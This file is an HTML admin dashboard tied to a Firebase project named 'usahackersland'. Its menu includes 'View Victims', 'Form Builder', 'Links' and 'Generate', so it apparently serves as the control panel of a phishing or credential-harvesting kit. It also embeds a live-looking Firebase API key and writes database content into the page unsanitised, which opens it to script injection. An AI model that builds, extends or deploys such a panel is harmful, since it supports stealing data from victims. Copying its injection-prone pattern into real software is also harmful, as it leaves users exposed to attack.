<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }

    /* Menu toggle */
    #menuToggle {
      position: fixed;
      top: 15px;
      left: 15px;
      font-size: 24px;
      background: lime;
      color: black;
      padding: 8px 14px;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      z-index: 2100;
    }

    #sidebar {
      position: fixed;
      top: 0;
      left: -260px;
      width: 260px;
      height: 100%;
      background: linear-gradient(180deg, #000 0%, #001a00 100%);
      border-right: 2px solid lime;
      transition: left 0.3s ease-in-out;
      padding-top: 60px;
      z-index: 2000;
    }
    #sidebar.active { left: 0; }

    #sidebar a {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 14px 20px;
      color: #0f0;
      font-weight: bold;
      text-decoration: none;
      border-bottom: 1px solid #003300;
    }
    #sidebar a:hover { background: #003300; color: #fff; }
    #sidebar a.logout { color: red; margin-top: 20px; border-top: 2px solid #003300; }
    #sidebar a.logout:hover { background: #330000; color: #fff; }
    #sidebar h2 { color: #0f0; text-align: center; margin-bottom: 20px; }

    #dashboardFrame {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
    }

    /* Emergency overlay */
    #emergencyOverlay {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #222;
      color: #fff;
      padding: 15px 20px;
      border-radius: 10px;
      border: 2px solid red;
      box-shadow: 0 0 15px rgba(255,0,0,0.6);
      z-index: 5000;
      max-width: 320px;
      display: none;
    }
    #emergencyOverlay img {
      max-width: 100%;
      margin-top: 10px;
      border-radius: 6px;
    }
    #deleteEmergency {
      margin-top: 10px;
      padding: 8px 12px;
      background: red;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      display: none; /* hidden for non-admins */
    }
    #deleteEmergency:hover { background: darkred; }
  </style>
</head>
<body>

  <div id="menuToggle" onclick="toggleMenu()">☰ Menu</div>

  <div id="sidebar">
    <h2>⚡ Admin Panel</h2>
    <a href="#" data-page="home.html">🏠 Home</a>
    <a href="#" data-page="form-builder.html">📝 Form Builder</a>
    <a href="#" data-page="saved-forms.html">💾 Saved Forms</a>
    <a href="#" data-page="feedback.html">💬 Feedback</a>
    <a href="#" data-page="victims.html">👀 View Victims</a>
    <a href="#" data-page="members.html">👥 Members</a>
    <a href="#" data-page="links.html">🔗 Links</a>
    <a href="#" data-page="generate.html">⚙️ Generate</a>
    <a href="#" data-page="admin-emergency.html">🚨 Admin Emergency</a>
    <a href="#" data-page="upload-logo.html">🖼️ Upload Logo</a>
    <a href="#" class="logout">🚪 Logout</a>
  </div>

  <!-- Dashboard -->
  <iframe id="dashboardFrame" src="home.html"></iframe>

  <!-- Emergency overlay -->
  <div id="emergencyOverlay">
    <div id="emergencyContent"></div>
    <button id="deleteEmergency">❌ Delete</button>
  </div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>

  <script>
    // 🔑 Replace with your admin UID
    const ADMIN_UID = "YOUR_ADMIN_UID";

    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee",
      measurementId: "G-ZJ05T7YNSQ"
    };
    firebase.initializeApp(firebaseConfig);

    const db = firebase.firestore();
    const auth = firebase.auth();

    const overlay = document.getElementById("emergencyOverlay");
    const content = document.getElementById("emergencyContent");
    const deleteBtn = document.getElementById("deleteEmergency");

    // Sidebar toggle
    function toggleMenu() {
      document.getElementById('sidebar').classList.toggle('active');
    }

    // Sidebar navigation
    document.querySelectorAll('#sidebar a[data-page]').forEach(link => {
      link.addEventListener('click', e => {
        e.preventDefault();
        document.getElementById('dashboardFrame').src = link.getAttribute('data-page');
        document.getElementById('sidebar').classList.remove('active');
      });
    });

    // Logout (redirect to logout.html)
    document.querySelector('#sidebar a.logout').addEventListener('click', e => {
      e.preventDefault();
      window.location.href = "logout.html";
    });

    // 🔥 Real-time emergency listener
    db.collection("emergency").doc("current").onSnapshot(doc => {
      if (doc.exists) {
        const data = doc.data();
        content.innerHTML = `
          <p>${data.text || ""}</p>
          ${data.image ? `<img src="${data.image}" alt="Emergency">` : ""}
        `;
        overlay.style.display = "block";
      } else {
        overlay.style.display = "none";
      }
    });

    // 👑 Show delete only if admin
    auth.onAuthStateChanged(user => {
      if (user && user.uid === ADMIN_UID) {
        deleteBtn.style.display = "block";
      }
    });

    // 🗑️ Delete emergency
    deleteBtn.addEventListener("click", async () => {
      if (confirm("Are you sure you want to delete this emergency message?")) {
        try {
          await db.collection("emergency").doc("current").delete();
          alert("✅ Emergency message deleted!");
          overlay.style.display = "none";
        } catch (err) {
          alert("❌ Delete failed: " + err.message);
        }
      }
    });
  </script>
</body>
</html>
